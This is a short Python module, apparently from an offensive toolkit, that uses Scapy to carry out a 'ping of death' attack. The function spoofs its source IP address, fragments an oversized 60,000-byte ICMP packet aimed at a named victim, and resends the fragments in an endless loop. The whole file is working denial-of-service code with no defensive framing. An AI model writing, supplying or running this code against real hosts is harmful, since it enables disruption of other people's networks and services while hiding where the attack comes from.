from scapy.all import *
from func.spoof_addr import spoof_addr
from time import sleep
import traceback

def ping_of_death(victim,quiet,terminal):
    try:
        spoofaddr = spoof_addr(terminal = terminal)
        packet = fragment(IP(src=spoofaddr,dst=victim)/ICMP()/("w"*60000))

        terminal.write('\n[+] Sending malformed ICMP packets to '+victim)

        while True:
            for p in packet:
                send(p,verbose=0)
                if not quiet:
                    terminal.write('\n[+] Packet Sent // '+str(p.summary()))
            sleep(2)
    except Exception as s:
        terminal.write('\n'+str(s))
        traceback.print_exc()
